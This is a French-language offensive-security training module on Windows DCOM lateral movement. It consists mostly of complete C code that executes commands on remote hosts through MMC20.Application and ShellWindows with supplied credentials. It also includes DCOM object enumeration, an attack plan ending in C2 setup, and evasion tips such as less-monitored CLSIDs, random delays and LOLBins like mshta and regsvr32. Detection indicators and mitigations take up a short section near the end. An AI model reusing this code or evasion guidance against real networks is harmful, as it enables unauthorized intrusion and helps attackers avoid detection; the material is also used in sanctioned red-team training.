# Module W70 : DCOM Lateral Movement

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre DCOM (Distributed Component Object Model)
- Exploiter les objets DCOM pour le mouvement lateral
- Implementer l'execution distante via MMC20.Application
- Utiliser ShellWindows et ShellBrowserWindow

## 1. Comprendre DCOM

### 1.1 Qu'est-ce que DCOM ?

DCOM est comme un systeme de telecommande pour Windows. Il permet a un programme sur une machine de controler des objets (programmes) sur une autre machine a distance.

```
MACHINE LOCALE                    MACHINE DISTANTE
┌──────────────┐                  ┌──────────────┐
│              │                  │              │
│  Client      │     DCOM         │  Serveur     │
│  (COM)       │═════════════════>│  COM Object  │
│              │   RPC (135)      │              │
│              │                  │              │
│  Appelle     │                  │  Execute     │
│  methode()   ├─────────────────>│  methode()   │
│              │                  │              │
└──────────────┘                  └──────────────┘
```

### 1.2 Architecture DCOM

```
COUCHE APPLICATION
┌────────────────────────────────────────────┐
│  Programme C/C++ qui utilise COM           │
│  CoCreateInstanceEx(), IDispatch, etc.     │
└──────────────────┬─────────────────────────┘
                   │
COUCHE COM/DCOM    │
┌──────────────────▼─────────────────────────┐
│  COM Runtime (ole32.dll, combase.dll)      │
│  - Marshalling/Unmarshalling               │
│  - Reference counting                      │
│  - Interface management                    │
└──────────────────┬─────────────────────────┘
                   │
COUCHE RPC         │
┌──────────────────▼─────────────────────────┐
│  RPC Runtime (rpcrt4.dll)                  │
│  - Serialization                           │
│  - Network transport                       │
│  - Authentication (NTLM/Kerberos)          │
└──────────────────┬─────────────────────────┘
                   │
RESEAU             │
┌──────────────────▼─────────────────────────┐
│  TCP/IP - Port 135 (RPC Endpoint Mapper)   │
│  Ports dynamiques 49152-65535              │
└────────────────────────────────────────────┘
```

### 1.3 Objets DCOM Exploitables

```
OBJETS DCOM INTERESSANTS POUR RED TEAM:

1. MMC20.Application
   CLSID: {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
   Permet: Execution de commandes via MMC
   Privileges: Utilisateur de la machine cible

2. ShellWindows
   CLSID: {9BA05972-F6A8-11CF-A442-00A0C90A8F39}
   Permet: Interagir avec Explorer.exe
   Privileges: Utilisateur actif

3. ShellBrowserWindow
   CLSID: {C08AFD90-F2A1-11D1-8455-00A0C91F3880}
   Permet: Executer des commandes
   Privileges: Utilisateur actif

4. Excel.Application / Word.Application
   CLSID: Divers
   Permet: Macros VBA, execution de code
   Privileges: Utilisateur
```

## 2. Implementation MMC20.Application

### 2.1 Concept

```
ETAPES:
1. Initialisation COM
2. Connexion a la machine distante
3. Creation de l'objet MMC20.Application
4. Ouverture d'un document MMC
5. Execution de code via ExecuteShellCommand
6. Nettoyage
```

### 2.2 Code C : MMC20 Lateral Movement

```c
#include <windows.h>
#include <stdio.h>
#include <comdef.h>
#import "mmc20.tlb" no_namespace

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

BOOL DCOMLateralMovement_MMC20(
    const wchar_t* targetHost,
    const wchar_t* username,
    const wchar_t* password,
    const wchar_t* command
) {
    HRESULT hr;
    COSERVERINFO serverInfo;
    MULTI_QI mqi;
    IDispatch* pDispatch = NULL;
    DISPID dispid;
    VARIANT result;
    DISPPARAMS params = {0};

    printf("[*] DCOM Lateral Movement via MMC20.Application\n");
    printf("[*] Target: %S\n", targetHost);

    // Initialiser COM
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("[!] CoInitializeEx failed: 0x%x\n", hr);
        return FALSE;
    }

    // Configurer les informations du serveur distant
    ZeroMemory(&serverInfo, sizeof(serverInfo));
    serverInfo.pwszName = (LPWSTR)targetHost;

    // Configurer l'authentification
    COAUTHIDENTITY authIdentity;
    ZeroMemory(&authIdentity, sizeof(authIdentity));

    authIdentity.User = (USHORT*)username;
    authIdentity.UserLength = wcslen(username);
    authIdentity.Password = (USHORT*)password;
    authIdentity.PasswordLength = wcslen(password);
    authIdentity.Domain = NULL;
    authIdentity.DomainLength = 0;
    authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    COAUTHINFO authInfo;
    ZeroMemory(&authInfo, sizeof(authInfo));
    authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
    authInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
    authInfo.pwszServerPrincName = NULL;
    authInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
    authInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    authInfo.pAuthIdentityData = &authIdentity;
    authInfo.dwCapabilities = EOAC_NONE;

    serverInfo.pAuthInfo = &authInfo;

    // CLSID de MMC20.Application
    CLSID clsid;
    hr = CLSIDFromString(L"{49B2791A-B1AE-4C90-9B8E-E860BA07F889}", &clsid);
    if (FAILED(hr)) {
        printf("[!] CLSIDFromString failed: 0x%x\n", hr);
        CoUninitialize();
        return FALSE;
    }

    // Creer l'instance distante
    printf("[*] Creation de l'instance DCOM distante...\n");

    mqi.pIID = &IID_IDispatch;
    mqi.pItf = NULL;
    mqi.hr = S_OK;

    hr = CoCreateInstanceEx(
        clsid,
        NULL,
        CLSCTX_REMOTE_SERVER,
        &serverInfo,
        1,
        &mqi
    );

    if (FAILED(hr) || FAILED(mqi.hr)) {
        printf("[!] CoCreateInstanceEx failed: 0x%x (mqi.hr: 0x%x)\n", hr, mqi.hr);
        CoUninitialize();
        return FALSE;
    }

    pDispatch = (IDispatch*)mqi.pItf;
    printf("[+] Instance DCOM creee avec succes\n");

    // Obtenir le DISPID de la methode Document
    LPOLESTR methodName = L"Document";
    hr = pDispatch->GetIDsOfNames(
        IID_NULL,
        &methodName,
        1,
        LOCALE_USER_DEFAULT,
        &dispid
    );

    if (FAILED(hr)) {
        printf("[!] GetIDsOfNames failed: 0x%x\n", hr);
        pDispatch->Release();
        CoUninitialize();
        return FALSE;
    }

    // Obtenir l'objet Document
    VariantInit(&result);
    hr = pDispatch->Invoke(
        dispid,
        IID_NULL,
        LOCALE_USER_DEFAULT,
        DISPATCH_PROPERTYGET,
        &params,
        &result,
        NULL,
        NULL
    );

    if (FAILED(hr)) {
        printf("[!] Invoke Document failed: 0x%x\n", hr);
        pDispatch->Release();
        CoUninitialize();
        return FALSE;
    }

    IDispatch* pDocument = result.pdispVal;
    printf("[+] Objet Document obtenu\n");

    // Obtenir ActiveView depuis Document
    methodName = L"ActiveView";
    hr = pDocument->GetIDsOfNames(
        IID_NULL,
        &methodName,
        1,
        LOCALE_USER_DEFAULT,
        &dispid
    );

    if (SUCCEEDED(hr)) {
        VariantClear(&result);
        VariantInit(&result);

        hr = pDocument->Invoke(
            dispid,
            IID_NULL,
            LOCALE_USER_DEFAULT,
            DISPATCH_PROPERTYGET,
            &params,
            &result,
            NULL,
            NULL
        );

        if (SUCCEEDED(hr)) {
            IDispatch* pActiveView = result.pdispVal;

            // Executer la commande via ExecuteShellCommand
            methodName = L"ExecuteShellCommand";
            hr = pActiveView->GetIDsOfNames(
                IID_NULL,
                &methodName,
                1,
                LOCALE_USER_DEFAULT,
                &dispid
            );

            if (SUCCEEDED(hr)) {
                // Preparer les parametres
                VARIANT args[4];
                for (int i = 0; i < 4; i++) {
                    VariantInit(&args[i]);
                }

                // Parametres: Command, Directory, Parameters, WindowState
                args[3].vt = VT_BSTR;
                args[3].bstrVal = SysAllocString(L"cmd.exe");

                args[2].vt = VT_BSTR;
                args[2].bstrVal = SysAllocString(L"C:\\Windows\\System32");

                args[1].vt = VT_BSTR;
                args[1].bstrVal = SysAllocString(command);

                args[0].vt = VT_I4;
                args[0].lVal = 7;  // SW_SHOWMINNOACTIVE

                DISPPARAMS execParams;
                execParams.rgvarg = args;
                execParams.cArgs = 4;
                execParams.rgdispidNamedArgs = NULL;
                execParams.cNamedArgs = 0;

                printf("[*] Execution de la commande...\n");
                hr = pActiveView->Invoke(
                    dispid,
                    IID_NULL,
                    LOCALE_USER_DEFAULT,
                    DISPATCH_METHOD,
                    &execParams,
                    NULL,
                    NULL,
                    NULL
                );

                if (SUCCEEDED(hr)) {
                    printf("[+] Commande executee avec succes!\n");
                } else {
                    printf("[!] ExecuteShellCommand failed: 0x%x\n", hr);
                }

                // Nettoyer
                for (int i = 0; i < 4; i++) {
                    VariantClear(&args[i]);
                }
            }

            pActiveView->Release();
        }
    }

    // Nettoyage final
    VariantClear(&result);
    pDocument->Release();
    pDispatch->Release();
    CoUninitialize();

    return SUCCEEDED(hr);
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("Usage: %s <target> <username> <password> [command]\n", argv[0]);
        printf("Example: %s 192.168.1.10 Administrator P@ssw0rd \"calc.exe\"\n", argv[0]);
        return 1;
    }

    wchar_t target[256], username[256], password[256], command[1024];

    MultiByteToWideChar(CP_ACP, 0, argv[1], -1, target, 256);
    MultiByteToWideChar(CP_ACP, 0, argv[2], -1, username, 256);
    MultiByteToWideChar(CP_ACP, 0, argv[3], -1, password, 256);

    if (argc >= 5) {
        MultiByteToWideChar(CP_ACP, 0, argv[4], -1, command, 1024);
    } else {
        wcscpy(command, L"calc.exe");
    }

    if (DCOMLateralMovement_MMC20(target, username, password, command)) {
        printf("\n[+] DCOM Lateral Movement reussi\n");
        return 0;
    } else {
        printf("\n[!] DCOM Lateral Movement echoue\n");
        return 1;
    }
}
```

## 3. ShellWindows & ShellBrowserWindow

### 3.1 Exploitation ShellWindows

```c
#include <windows.h>
#include <exdisp.h>
#include <shlobj.h>

BOOL DCOMLateral_ShellWindows(
    const wchar_t* targetHost,
    const wchar_t* command
) {
    HRESULT hr;
    IShellWindows* pShellWindows = NULL;
    IDispatch* pDispatch = NULL;
    IWebBrowser2* pBrowser = NULL;
    VARIANT vEmpty;
    VARIANT vUrl;
    long windowCount = 0;

    printf("[*] DCOM via ShellWindows\n");

    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return FALSE;

    // Creer l'objet ShellWindows
    hr = CoCreateInstance(
        CLSID_ShellWindows,
        NULL,
        CLSCTX_LOCAL_SERVER,
        IID_IShellWindows,
        (void**)&pShellWindows
    );

    if (FAILED(hr)) {
        printf("[!] CoCreateInstance failed: 0x%x\n", hr);
        CoUninitialize();
        return FALSE;
    }

    // Obtenir le nombre de fenetres
    hr = pShellWindows->get_Count(&windowCount);
    printf("[*] Nombre de fenetres Shell: %ld\n", windowCount);

    // Iterer sur les fenetres
    for (long i = 0; i < windowCount; i++) {
        VARIANT vIndex;
        VariantInit(&vIndex);
        vIndex.vt = VT_I4;
        vIndex.lVal = i;

        hr = pShellWindows->Item(vIndex, &pDispatch);
        if (SUCCEEDED(hr) && pDispatch) {
            hr = pDispatch->QueryInterface(IID_IWebBrowser2, (void**)&pBrowser);
            if (SUCCEEDED(hr) && pBrowser) {
                // Naviguer vers notre payload
                VariantInit(&vEmpty);
                VariantInit(&vUrl);
                vUrl.vt = VT_BSTR;
                vUrl.bstrVal = SysAllocString(command);

                hr = pBrowser->Navigate2(&vUrl, &vEmpty, &vEmpty, &vEmpty, &vEmpty);

                VariantClear(&vUrl);
                pBrowser->Release();
            }
            pDispatch->Release();
        }
    }

    pShellWindows->Release();
    CoUninitialize();

    return TRUE;
}
```

## 4. Enumeration DCOM

### 4.1 Lister les Objets DCOM

```c
#include <windows.h>
#include <stdio.h>

void EnumerateDCOMObjects() {
    HKEY hKey;
    DWORD index = 0;
    char className[256];
    DWORD classNameSize;

    printf("[*] Enumeration des objets DCOM...\n\n");

    // Ouvrir la cle de registre CLSID
    if (RegOpenKeyExA(
        HKEY_CLASSES_ROOT,
        "CLSID",
        0,
        KEY_READ,
        &hKey
    ) != ERROR_SUCCESS) {
        printf("[!] Impossible d'ouvrir CLSID\n");
        return;
    }

    // Enumerer les CLSIDs
    while (1) {
        classNameSize = sizeof(className);

        if (RegEnumKeyExA(
            hKey,
            index,
            className,
            &classNameSize,
            NULL,
            NULL,
            NULL,
            NULL
        ) != ERROR_SUCCESS) {
            break;
        }

        // Verifier si c'est un objet DCOM (a une cle AppID)
        char subKeyPath[512];
        snprintf(subKeyPath, sizeof(subKeyPath), "CLSID\\%s\\AppID", className);

        HKEY hSubKey;
        if (RegOpenKeyExA(
            HKEY_CLASSES_ROOT,
            subKeyPath,
            0,
            KEY_READ,
            &hSubKey
        ) == ERROR_SUCCESS) {
            printf("[+] DCOM Object: %s\n", className);

            // Lire le nom
            char friendlyName[256];
            DWORD nameSize = sizeof(friendlyName);
            snprintf(subKeyPath, sizeof(subKeyPath), "CLSID\\%s", className);

            HKEY hNameKey;
            if (RegOpenKeyExA(HKEY_CLASSES_ROOT, subKeyPath, 0, KEY_READ, &hNameKey) == ERROR_SUCCESS) {
                if (RegQueryValueExA(hNameKey, NULL, NULL, NULL, (LPBYTE)friendlyName, &nameSize) == ERROR_SUCCESS) {
                    printf("    Name: %s\n", friendlyName);
                }
                RegCloseKey(hNameKey);
            }

            RegCloseKey(hSubKey);
        }

        index++;
    }

    RegCloseKey(hKey);
    printf("\n[*] Enumeration terminee\n");
}
```

## 5. Applications Offensives

### 5.1 Scenario Red Team

```
OBJECTIF: Mouvement lateral furtif sans creation de service

PHASE 1: RECONNAISSANCE
├─ Enumerer les objets DCOM disponibles
├─ Identifier les cibles avec DCOM active
└─ Verifier les permissions

PHASE 2: EXPLOITATION
├─ Tenter MMC20.Application
├─ Si echec, essayer ShellWindows
├─ Si echec, essayer ShellBrowserWindow
└─ Executer le payload

PHASE 3: POST-EXPLOITATION
├─ Etablir C2 via payload
├─ Enumeration locale
└─ Continuer le mouvement lateral
```

### 5.2 Avantages vs PsExec

```
DCOM vs PSEXEC:

DCOM Avantages:
+ Pas de creation de service (Event ID 7045)
+ Moins surveille par les EDR
+ Utilise des objets Windows legitimes
+ Peut contourner certaines regles firewall

DCOM Inconvenients:
- Plus complexe a implementer
- Necessite des privileges similaires
- Peut etre bloque par le firewall Windows
- Logs dans Event ID 4688 (Process Creation)

PSEXEC Avantages:
+ Simple et direct
+ Fiable
+ Controle total sur l'execution

PSEXEC Inconvenients:
- Tres surveille
- Event ID 7045 (Service Installation)
- Signatures connues des EDR
```

### 5.3 Detection et Evasion

**Indicateurs de Detection:**
```
- Event ID 4688 (Process Creation) avec parent inhabituel
- Connexions RPC sur port 135
- Acces aux objets COM distants
- Network logon (Event ID 4624 Type 3)
- Objets COM crees a distance
```

**Techniques d'Evasion:**
```c
// 1. Utiliser des objets DCOM moins surveilles
const wchar_t* stealthyObjects[] = {
    L"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}",  // ShellWindows
    L"{C08AFD90-F2A1-11D1-8455-00A0C91F3880}",  // ShellBrowserWindow
    // Eviter MMC20 qui est plus surveille
};

// 2. Espacer les tentatives
void StealthDelay() {
    Sleep((rand() % 30 + 10) * 1000);  // 10-40 secondes
}

// 3. Utiliser des payloads signes et legitimes
const wchar_t* lolbins[] = {
    L"rundll32.exe",
    L"regsvr32.exe",
    L"mshta.exe"
};

// 4. Nettoyer les connexions COM
void CleanupCOM() {
    CoUninitialize();
    Sleep(1000);
}
```

## 6. Mitigations et Defense

### 6.1 Protections

```
MITIGATIONS:

1. Desactiver DCOM si non necessaire:
   - Component Services -> Computers -> My Computer
   - Properties -> Default Properties
   - Decocher "Enable Distributed COM"

2. Firewall:
   - Bloquer port 135 (RPC Endpoint Mapper)
   - Bloquer ports dynamiques 49152-65535

3. Hardening Registry:
   HKLM\SOFTWARE\Classes\CLSID\{CLSID}\
   - Supprimer les CLSIDs inutiles
   - Restreindre les permissions

4. Monitoring:
   - Event ID 4688 (Process Creation)
   - Event ID 4624 (Logon Type 3)
   - RPC traffic monitoring

5. Privileges:
   - Appliquer le principe du moindre privilege
   - Limiter les comptes admin locaux
```

## 7. Checklist DCOM

```
[ ] Comprendre l'architecture COM/DCOM
[ ] Savoir initialiser COM avec CoInitializeEx
[ ] Creer des instances DCOM distantes avec CoCreateInstanceEx
[ ] Manipuler les interfaces IDispatch
[ ] Implementer MMC20.Application lateral movement
[ ] Utiliser ShellWindows pour l'execution
[ ] Enumerer les objets DCOM disponibles
[ ] Comprendre les mitigations (firewall, registry)
[ ] Implementer des techniques d'evasion
[ ] Comparer avec PsExec et WMI
```

## 8. Exercices

Voir [exercice.md](exercice.md)

## Ressources Complementaires

- MITRE ATT&CK: T1021.003 (Remote Services: Distributed Component Object Model)
- Microsoft: DCOM Security Enhancements
- Cybereason: DCOM Lateral Movement Techniques
- Enigma0x3: DCOM Research Blog Posts

---

**Navigation**
- [Module precedent](../W69_psexec_technique/)
- [Module suivant](../../PHASE_W07_KERNEL/W71_driver_basics/)
